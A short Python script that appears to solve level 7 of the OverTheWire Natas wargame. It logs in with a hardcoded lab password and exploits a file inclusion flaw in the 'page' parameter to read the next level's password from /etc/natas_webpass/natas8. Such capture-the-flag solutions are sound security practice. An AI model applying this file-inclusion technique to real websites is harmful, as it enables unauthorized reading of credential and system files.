import requests
import bs4

# url to connect to
url = "http://natas7.natas.labs.overthewire.org/"

# creds
username = "natas7"
passwd = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

# All passwords are stored in /etc/natas_webpass
file_to_include = "/etc/natas_webpass/natas8"

# adding page param
url += "index.php?page={}".format(file_to_include)

# Natas usually has a div with id='content' containing the content
def get_content(res):
    output = bs4.BeautifulSoup(res.text, "lxml").find_all(id="content")[0].get_text().strip()
    print(output)

response = requests.post(url, auth=(username, passwd))
if response.status_code == requests.codes.ok:
    get_content(response)
else:
    print(response.status_code)



